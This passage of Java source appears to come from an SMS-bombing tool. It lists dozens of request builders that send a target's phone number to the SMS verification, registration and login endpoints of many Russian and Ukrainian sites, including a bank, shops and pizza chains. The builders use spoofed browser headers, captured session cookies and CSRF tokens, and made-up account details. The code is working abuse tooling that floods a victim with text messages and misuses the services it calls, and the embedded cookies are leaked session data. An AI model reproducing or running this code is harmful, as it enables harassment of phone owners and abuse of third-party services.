                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: __js_p_=191,1800,0,0,0; __jhash_=1064; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; __lhash_=83b96a60b0757cc6d8453d6bce719087; PHPSESSID=258f4d20c809bc213e42c1db5a33017b; BITRIX_SM_SALE_UID=476d76677dc5c56c4f5c463c3b9aa874; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1682974740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gcl_au=1.1.237613471.1682939195; flocktory-uuid=52c1b31a-3ef1-4f6d-aef4-84de50a73b8b-9; gcui=; gcmi=; gcvi=OCLukNCKntX; gcsi=gA7L2NyZqjE; _ga_VNL8C6TDCT=GS1.1.1682939195.1.0.1682939195.60.0.0; _userGUID=0:lh4qjm5l:dCSFCluk6CwEo5eNzPRJ5EBYzYcsWt5K; dSesn=16840b2b-20cb-3533-9d4d-b711c6627a62; _dvs=0:lh4qjm5l:f32nIdkdj2xO8r17p5AGKUmRSfTwImgJ; rrpvid=952084627110672; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.545756460.1682939196; _gid=GA1.2.1607227217.1682939196; _gat_UA-97400312-1=1; _gat_UA-97400312-2=1; _ym_uid=1674663975775501735; _ym_d=1682939196; advcake_trackid=21990e82-9127-f8e2-1693-db5b914202f6; advcake_session_id=4ff73dcc-01dd-74fe-c731-e1d49818c5a1; rcuid=6275fcd65368be000135cd22; _spx=eyJpZCI6IjJkNTQ4MzkwLTc2MzktNDQxOS1hM2IyLWM2ZTkxZmZmYzRiYSIsInNvdXJjZSI6IiIsImRlcHRoIjp7InZhbHVlIjp7ImRlcHRoIjoxLCJoaXN0b3J5IjpbMF19fSwidGltZSI6eyJ0aW1lIjoxNjgyOTM5MTk2NDg2fSwiZml4ZWQiOnsic3RhY2siOlswXX19; tmr_lvid=2fcc8a7885309fab71d1edf23778c5b6; tmr_lvidTS=1674663974919; _ym_isad=2; X-User-DeviceId=8038803a-73b7-47c5-b7a4-ea918ccd2589; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=4a291964-49f2-48d8-b032-a6c1ac8bba17; adrdel=1; adrcid=AZZZYvYyjgxQ4tvouNKmhhg; analytic_id=1682939197940287; tmr_detect=0%7C1682939199063; __hash_=302c1be4fc7dc9b97c7672bb0db6e53a' \\\n" +
                        "  -H 'origin: https://lgcity.ru' \\\n" +
                        "  -H 'referer: https://lgcity.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-request-csrf-token: a7141c3c045a34f8f3e6c445ce228b6d' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'sentCode=&phone={formatted_phone:%2B*+(***)+***-****}&code=&smsSubscription=Y' \\\n" +
                        "  --compressed"),

                new FormService("https://planetazdorovo.ru/ajax/vigroup-p_a.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(new Headers.Builder()
                                .add("Referer", "https://planetazdorovo.ru/lk/signin/")
                                .add("Host", "planetazdorovo.ru")
                                .add("Sec-Fetch-Dest", "empty")
                                .add("Sec-Fetch-Mode", "cors")
                                .add("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"")
                                .add("sec-ch-ua-mobile", "?0")
                                .add("sec-ch-ua-platform", "\"Windows\"")
                                .add("Sec-Fetch-Site", "same-site")
                                .addUnsafeNonAscii("Cookie", "qrator_jsr=1677582740.566.In07njqCVZw5koqB-k1b092ul36om26ol7ajbmmvqgdhvbvj4-00; qrator_ssid=1677582740.999.bsbTQ9GJ8X3V7fdw-ke00ru45nn5p8jb1ovg1vk3sqh7lr9a4; qrator_jsid=1677582740.566.In07njqCVZw5koqB-jlkvgbqlci6fmb5mohn5c5ntrl85nemp; city_id=749807; city_xml=363; city=Москва и МО; city_code=moskva-i-mo; help_phone=(495) 369-33-00; order_phone=8 (495) 145-99-33; region=12; timezone=10800; show_bonus=1; region_id=16; PHPSESSID=OMzzD9XPBUsMvzhXaKHQLEoIWe7caD4H; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1677610740,\"UNIQUE\":[\"conversion_visit_day\"]}; _gcl_au=1.1.347187122.1677582744; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.360028804.1677582744; _gid=GA1.2.463013004.1677582744; tmr_lvid=f20e6d758cfa83ebe50bff36e0e4adaa; tmr_lvidTS=1661187312248; _dc_gtm_UA-126829878-1=1; _ym_uid=1661187313781808485; _ym_d=1677582745; _ym_isad=2; _ym_visorc=b; tmr_detect=0|1677582748986; carrotquest_session=npr74mk7dbi2tp94abgqye0sdfq01vmj; carrotquest_session_started=1; carrotquest_device_guid=350a2f93-ae05-4187-867c-16281e97040c; carrotquest_uid=1388102814265248160; carrotquest_auth_token=user.1388102814265248160.23139-c082d1441dfd0f22105416f38a.2dc58f4da60c0268408468b874082f4711e468538b1f82a9; carrotquest_realtime_services_transport=wss")
                                .addUnsafeNonAscii("X-Requested-With", "XMLHttpRequest")
                                .build());

                        builder.add("sessid", "f74d886e3df6be27574c309a0e9207da");
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-****"));
                        builder.add("Login", "");
                    }
                },

                new JsonService("https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/nn/auth/request_code/", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57");
                        request.header("Cookie", "cityId=23; sessionid=yxwpnnmtmfy2peeytvjo9kj3kiq2lv9n; rerf=AAAAAGP99PKfCoeNA8e0Ag==; _ga=GA1.2.277914625.1677587700; _gid=GA1.2.1785919836.1677587700; tmr_lvid=40677f5848edffde0fc28433bafe137f; tmr_lvidTS=1677587699936; _tt_enable_cookie=1; _ttp=R-8KDrOnkQJb2ZeLtJ0LsJ923uW; _ym_uid=1677587701806969337; _ym_d=1677587701; _ym_isad=2; _ym_visorc=b");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .put("ui_element", "login")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://vodnik.ru/signin/sms-request", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "s25a=u4ndvlp0r26durgi2uoj0ksmuc; s25shopuid=u4ndvlp0r26durgi2uoj0ksmuc; _gcl_au=1.1.1586843065.1677588634; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_first_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57; sbjs_session=pgs=1|||cpg=https://vodnik.ru/; _ga=GA1.2.2011946081.1677588634; _gid=GA1.2.324262795.1677588634; _dc_gtm_UA-34944982-1=1; _gat_UA-34944982-1=1; tmr_lvid=7bec5deb51717470cbe877180f97522b; tmr_lvidTS=1677588634426; _ym_uid=1677588635482671495; _ym_d=1677588635; adrdel=1; adrcid=Aj7OPttQx7VBI30FVh8R7-w; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1677588637044");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+7 ***-***-**-**"))
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://lk.zaim-express.ru/Account/RegisterCode", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", ".AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8PIBqEVSjzpBkUhnd5gD6hRFuPIyWIRHvk7WETivIQ6sWgvFWBlhlxBZLkF9m3RzPUTfCsMjzrtG7aCPV5UNKgZLxrNX1fjoASszqEbsTFrsrtGrrUG1a39yMwd3nukdHGcT7lWPS0oT03Tlxy3OHgs; .LoanExpress.Session=CfDJ8PIBqEVSjzpBkUhnd5gD6hRUjVIXcF7Qjk/vsPeRrReI8/HQCyyoseAycjzquMGXWrEm+3B40xCyUZf+FTEPgEK3CABKs5Sq62hakDyY0nvB7coA9s89XvA5l4NsLfQ2bkXnvNRRqLfNS5r//ULnFlsBkb5J3Mto6d0cYaSNZTE1; _ym_uid=1677588936312422059; _ym_d=1677588936; _ym_isad=2; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.484481173.1677588936; _ym_visorc=b; _ga_2JB47PMSVE=GS1.1.1677588936.1.1.1677589010.0.0.0; _ga=GA1.2.1772293061.1677588936; _gat_gtag_UA_76114749_2=1");

                        builder.add("CellNumber", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new JsonService("https://ipizza.ru/gql", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        return "{\"query\":\"mutation sendPhone($domain:ID!,$phone:String!,$recaptcha:String){phone(number:$phone,region:$domain,recaptcha:$recaptcha){token error{code message}}}\",\"variables\":{\"domain\":\"msk\",\"phone\":\"" + phone + "\"}}";
                    }
                },

                new JsonService("https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        return "{\"fio\":\"\",\"password\":\"gewgerwgergewrger3t\",\"email\":\"\",\"emailAdvertAccepted\":true,\"phoneNumber\":\"+" + phone + "\",\"webReferrer\":\"\",\"advertInfo\":\"ga_client_id=GA1.1.1519138250.1677588511\",\"platformInfo\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57\",\"promoId\":\"\",\"ecupis\":true,\"birthday\":\"1982-02-01\",\"sysId\":1,\"lang\":\"ru\",\"appVersion\":\"4.21.1\",\"deviceId\":\"F00A7159477F67B7B4FA0EE3B0C02A2F\"}";
                    }
                },

                new FormService("https://semena-partner.ru/ajax/getPhoneCodeReg.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=8Kg3rH9a1vAjAJOAq7zi3nXb90jwzcGQ; BITRIX_SM_lonCookie=1677589657; BITRIX_SM_lonCookieCondition=c0; _ym_uid=1677589660863243211; _ym_d=1677589660; _ga=GA1.2.322385156.1677589660; _gid=GA1.2.198810140.1677589660; _gat=1; rrpvid=607519930160743; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22");
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***) ***-**-**"));
                    }
                },

                new FormService("https://agro-market24.ru/ajax/auth.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("newrelic", "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MzE0NDciLCJhcCI6IjI4OTc1NjMyNiIsImlkIjoiYjk0YWNjYjM3NmJkYTQyOSIsInRyIjoiNmYwMmQ4YTY3MTU0YzY2MDZhMTMzMTM3YzgxMmRiODAiLCJ0aSI6MTY3NzU4OTkwNTAyMH19");
                        request.header("traceparent", "00-6f02d8a67154c6606a133137c812db80-b94accb376bda429-01");
                        request.header("x-newrelic-id", "VgAEUFJXDxACV1NQAwADXlE=");
                        request.header("tracestate", "2631447@nr=0-1-2631447-289756326-b94accb376bda429----1677589905020");

                        builder.add("mode", "reg");
                        builder.add("phone", Phone.format(phone.getPhone(), "+7(***)*******"));
                        builder.add("name", getUserName());
                        builder.add("email", getEmail());
                        builder.add("code", "0");
                    }
                },

                new JsonService("https://api.starterapp.ru/bdbar/auth/resetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("sessionid", "74b74767-244a-42ef-acd7-bc38916e79f4");
                        request.header("authcode", "");
                        request.header("lang", "ru");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://tashirpizza.ru/ajax/mindbox_send_sms", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        builder.add("smsType", "simple");
                    }
                },

                new FormService("https://tehnoskarb.ua/register", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.380904791.1677590803; _ga=GA1.1.701174307.1677590803; _fbp=fb.1.1677590804301.1176961182; dashly_device_guid=2d44a8af-e1f3-4593-8022-a11e7adbbb00; dashly_uid=1388170375157778425; dashly_auth_token=user.1388170375157778425.4561-b2b6523d280093ec133617ae010.afed4a86ba8fb4479c4c3691c66b893b1894e3b00906f209; dashly_session=kdsomp5khudhjyvq65o67afezvy8vmaz; dashly_session_started=1; dashly_realtime_services_transport=wss; _ga_1P2E8RZQPX=GS1.1.1677859782.3.1.1677859804.38.0.0");

                        builder.add("name", getUserName());
                        builder.add("email", getEmail());
                        builder.add("phone", Phone.format(phone.getPhone(), "+380(**)***-**-**"));
                        builder.add("password", "fwe31434123Q");
                        builder.add("confirmPassword", "fwe31434123Q");
                        builder.add("subaction", "saveUser");
                    }
                },

                new ParamsService("https://www.vodovoz-spb.ru/udata/users/user_phone/.json", 7) {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new FormService("https://hvalwaters.ru/register/send-sms-code/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("X-CSRF-TOKEN", "3K03ra96n2jDeCKVSuCtdbY26MEFSBAcAIrrPYM4");
                        request.header("X-Requested-With", "X-Requested-With");
                        request.header("Cookie", "gid=eyJpdiI6IlJBL3liZFpRYkRVWWVWSi9CRVdyQ0E9PSIsInZhbHVlIjoiNzJ2eWVBMnJCblFKcm4vQzhIOWFBTVA3a0drTkI5clF2bnhLaE9WdFdBclRnNGJYbGpKc2d3c1RQL3YzZUp3eWJCQklFTUJIWU9UelhhODhwRXdaaGdLUFpkZzlzODVSRHhRcm9IaEpiNjg9IiwibWFjIjoiMjdiZDJkY2QxZmMyMDRmZjViYjdkMzk1Zjg4Njk0OTQ2OGE0NDJlYzEzODRhYjU2MTkwZTY1NWJmZDFiOTRhNCIsInRhZyI6IiJ9; show_mobile_block_app_2=eyJpdiI6IlJiZ0tqK1lOVEZqdzVEZldhRFJmZ3c9PSIsInZhbHVlIjoiOFJQY1RSdlR3a3RYaDhGZExpalF5TzdOd1B5ZmZUTkt0MEg4cUcweG1HcUFDall3VFBHcGdpd3RmalUzd1MyYyIsIm1hYyI6ImM3NzU0OWM2ZjIyZDc0YWIzYzI0OTU0NjUzM2Q2MDhhOTVkMThlMTBiZDg1YTc1MDA5YmEzYmViNTkyYmM1ZTMiLCJ0YWciOiIifQ==; tmr_lvid=d046a1a213cc8bbe63676e94de623dc7; tmr_lvidTS=1680709392744; XSRF-TOKEN=eyJpdiI6IjE1bmg1bjhYOFVhU1lRMFpZMC9SaFE9PSIsInZhbHVlIjoiMHFDTll1Y1lxNCt5dlMzSFI3enhkdUhoUjBsbENZSWtPdDFEUGplK3d0Um1aelJHVERLSGVJWWJpUFJCUDVjbzF6RWo0K1NkVGZaaWtaeGFnMHdRc21nNEhvd0huZEVoSGRCU0FQSmF1Q2VndzBHZ3QzOWk5SmxmSjN3T1ZUTXUiLCJtYWMiOiJiNzlkMWI3MjEzMmMxMGZlZDI5Y2Y2NWY1MDUzYjQ1ZTgwYWQzNjM1NTFhYjRhYmVkYzdkZGI3ZDJiOTZmMjU2IiwidGFnIjoiIn0=; xvalovskie_vody_session=eyJpdiI6InIvMnVHSjBOcWl2bTFjOU03QjNBVWc9PSIsInZhbHVlIjoiWFBGZ2oyVmp4d2xYS3FaSkNPZEZrTEJNUzNEcmFwU0pUOTBnVTIxWFdlWnJ1Tll4VStvdkxXRU0vK3l4RVhwMXF5RnBaVjVoaldMRkpJOVg0YVNDREc5TUg5dzBENiswYitjTCtHZytnaWNsRlJZSEw1QXJCYWp3dG5xWncwbXYiLCJtYWMiOiJmNjZlMDQ2YmUzOWY2NGMyZTY1Y2ViZDU5MzZiZDdlY2NkYmZhM2U1ZGFjZjI4N2VmZTk2ZDdkMjYyNTU5ODAxIiwidGFnIjoiIn0=; wcid=eyJpdiI6IitFVGZvQzJFK1VmQzUvaGcySWhiNEE9PSIsInZhbHVlIjoiNWNFeVJ2U05sUWthNGVjOTdZVzMxUDlWQnhZeC9ST3JML2FJbHNmaUllT1ZDVWFWaXFpZVI5SThpQlRnMkhEQSIsIm1hYyI6IjhhNTU0ZGFlYTZjYzcwMGI1ZWM0MTAzNmU3NDMxZmYyMTE5N2Q2YjcwZGNlYjYzNTc3ZjUxOGVhZjYxMTliOTgiLCJ0YWciOiIifQ==; _ga=GA1.2.664543174.1680709393; _gid=GA1.2.1486154669.1680709393; _gat_gtag_UA_44138349_1=1; _ym_uid=1680709393637923039; _ym_d=1680709393; _ym_visorc=w; _ym_isad=2; cted=modId=7ed2229d;client_id=664543174.1680709393;ya_client_id=1680709393637923039; tmr_detect=0|1680709399967");

                        builder.add("phone", Phone.format(phone.getPhone(), "7(***) ***-****"));
                    }
                },

                new FormService("https://rf.driptip.ru/signup/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "__ddg1_=ZmQtjxk6pvG7jkNta5vd; PHPSESSID=vmpoeb2lj1g04fbhatcg6e7rd0; landing=/signup/; buyerstat__id=642d97ec83b5e; user_agent=desktop; _ym_uid=1680709614211847501; _ym_d=1680709614; _ym_isad=2; _ga_FN3XP284GB=GS1.1.1680709614.1.0.1680709614.0.0.0; _ga=GA1.2.1147869418.1680709614; _gid=GA1.2.1503340979.1680709614; _gat_gtag_UA_56207650_1=1");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("data[firstname]", getUserName());
                        builder.add("data[email]", getEmail());
                        builder.add("data[phone]", "+" + phone);
                        builder.add("data[birthday][day]", "14");
                        builder.add("data[birthday][month]", "4");
                        builder.add("data[birthday][year]", "2001");
                        builder.add("wa_json_mode", "1");
                        builder.add("need_redirects", "1");
                        builder.add("contact_type", "person");
                    }
                },

                new MultipartService("https://api.nbcomputers.ru/api/user/registration", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.addFormDataPart("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://api.nbcomputers.ru/api/user/registration")
                                .post(RequestBody.create("------WebKitFormBoundaryAhgEzNl6lSOnl6vr\n" +
                                        "Content-Disposition: form-data; name=\"phone\"\n" +
                                        "\n" +
                                        phone.format("+7 (***) ***-**-**") +
                                        "\n------WebKitFormBoundaryAhgEzNl6lSOnl6vr--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryAhgEzNl6lSOnl6vr")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://online.sberbank.ru/CSAFront/uapi/v2/authenticate", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Accept", "application/json, text/plain, */*");
                        request.header("Origin", "https://online.sberbank.ru");
                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");
                        request.header("Referer", "https://online.sberbank.ru");
                        request.header("Cookie", "f5avraaaaaaaaaaaaaaaa_session_=LMKFMKCFCKBBCDHGIDBNHFEIFEBIIGCKJNNOLHNDNDGPOAIPMNBMFDPHMKNGKLCPGCKDFLKHOKEMKLDNJGJAAEBFHJPHHJJDNMHIDFMAICPGDHENNNCDBCKOMIEHDHJL; ESAWEBJSESSIONID=PBC5YS:-1592978582; ESAUAPIJSESSIONID=PBC5YS:-1401443471; TS0135c014=0156c5c8603d42898e476b45b51aabb2a8f79520eb39fba20032e067b52aeec7ca69ebbd8e169e3274802a949082e444146ea45b28ce3e31994e88487c5b66404b08a8d711091f5821afd2f2c333998ed232338bd8; sbid_save_login=false; TS014759d1=0156c5c8600f8ab0efc50bbb13a458c79226cd158039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e433360f80eed46e6358c40efad04d37b5514d2adc9e428b8ab16be5a1a422bef8; _sv=SA1.8ed47a79-c4ce-4990-a3b9-702d969ab535.1670155776; _gcl_au=1.1.1368651913.1680710321; _ym_uid=165997501787354883; _ym_d=1680710321; _sa=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321; tmr_lvid=fe45132553fe9d1cacfd3293ecfac8c2; tmr_lvidTS=1659975017497; _ym_isad=2; top100_id=t1.3122244.1104513110.1680710321533; adtech_uid=4cb771be-35b5-4398-bda2-a2e5bec91512:sberbank.ru; adrdel=1; adrcid=A2h_BfB_cAeLGOfEv5sJZFw; t2_sid_3122244=s1.362560733.1680710321535.1680710325559.1.11.11; JSESSIONID=node0elr4dl5la6p3opwxbogk0eyh11444053.node0; sb-sid=26aca1a7-e98d-4ce8-bb37-dbcec0970f2c; sb-id=gYEl6L3DkLtDBreaGke0twO_AAABh1IkW1O0fIbpW5dFW7L4ClXYigu3JP0qgdT-kxg3jxH0E-gpnTI2YWNhMWE3LWU5OGQtNGNlOC1iYjM3LWRiY2VjMDk3MGYyYw; sb-pid=gYFSXfnWV2pE4ISEQGXI82ccAAABh1IkW1N_DuqFUvibhqECoTB97tQmdGCXZcmJ-ADw9w9aiOYIIA; _sas=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321.1680710329; UAPIJSESSIONID=node0o03mgi79yllsawxtnl4r6bl42517498.node0; sbrf.pers_sign=0; TS019e0e98=0156c5c860b7d7da03b7f51385dfd60554e906c61039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452feb3440e06dc44ae286826814333a90a448c21074fa0c6a00cbcc07555a8192f2dc2740c50a7597ab671ba789c6aeb5f4bcbd66982f6eafeb75b46ddcfd2b3f6a9c; TS019a42f2=0156c5c860a908faaa555abcfe63a6befa9aa5458439fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e4599951af491f02d3f381bc84a363ed3f776296a421fb2d06ab15559b314bc92e; TS019e0e98030=01e9874edf1cfda0bef4ced6a4d030508452c212d7ee41ebe13a58632b85bbea9ba07dc27259da1f260d5df6c39fd7a0e483ad940c; TS3bb85bd7027=08bd9624b8ab2000660a77af35bf89cf80ffc33769930767dc909391c1385ce25ef34e54dec1cef708bb4760f51130003f1023d9e81eb651e6a03b158cdb4d0514bd448afa45a2f9fd46dac25d2c3585e1c35c3256791b2661002600e2cd6b48");
                        request.header("Process-ID", "b356eea04fdf424a8a14337113d22631");
                        request.header("X-TS-AJAX-Request", "true");

                        return "{\"identifier\":{\"type\":\"phone\",\"data\":{\"value\":\"" + phone + "\"}},\"authenticator\":{\"type\":\"sms_otp\",\"data\":{}},\"channel\":{\"type\":\"web\",\"user_type\":\"private\",\"data\":{\"rsa_data\":{\"dom_elements\":\"\",\"htmlinjection\":\"\",\"manvsmachinedetection\":\"\",\"js_events\":\"\",\"deviceprint\":\"version=1.7.3&pm_br=Chrome&pm_brmjv=108&iframed=0&intip=&pm_expt=&pm_fpacn=Mozilla&pm_fpan=Netscape&pm_fpasw=internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer&pm_fpco=1&pm_fpjv=0&pm_fpln=lang=ru|syslang=|userlang=&pm_fpol=true&pm_fposp=&pm_fpsaw=1536&pm_fpsbd=&pm_fpsc=24|1536|864|816&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpspd=24&pm_fpsui=&pm_fpsw=&pm_fptz=3&pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/108.0.0.0 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36|Windows&pm_fpup=&pm_inpt=&pm_os=Windows&adsblock=0=false|1=false|2=false|3=false|4=false&audio=baseLatency=0.01|outputLatency=0|sampleRate=44100|state=suspended|maxChannelCount=2|numberOfInputs=1|numberOfOutputs=1|channelCount=2|channelCountMode=max|channelInterpretation=speakers|fftSize=2048|frequencyBinCount=1024|minDecibels=-100|maxDecibels=-30|smoothingTimeConstant=0.8&pm_fpsfse=true&webgl=ver=webgl2|vendor=Google Inc. (AMD)|render=ANGLE (AMD, AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)\"},\"oidc\":{\"scope\":\"address_reg birthdate email mobile name openid verified\",\"response_type\":\"code\",\"redirect_uri\":\"https://profile.sber.ru\",\"state\":\"43c54272-1a34-4c6f-a470-52bd53bd1e1c\",\"nonce\":\"34c136bb-7f07-492b-8f13-3d162a5ae7ba\",\"client_id\":\"2679efe6-f358-4378-b328-45dfcc4a006a\",\"referer_uri\":\"https://profile.sber.ru/\"},\"browser\":\"Chrome\",\"os\":\"Windows 10\"}}}";
                    }
                },

                new ParamsService("https://apis.flowwow.com/apiuser/auth/sendSms/") {
                    @Override
                    public void buildParams(Phone phone) {
                        builder.addQueryParameter("phone", "+" + phone);
                        builder.addQueryParameter("user_type", "client");
                        builder.addQueryParameter("lang", "ru");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("Referer", "https://flowwow.com/");
                        request.header("Origin", "https://flowwow.com");
                    }
                },

                new JsonService("https://www.cdek.ru/api-site/auth/send-code", 7) {
                    @Override
                    public String buildJson(Phone phone) {
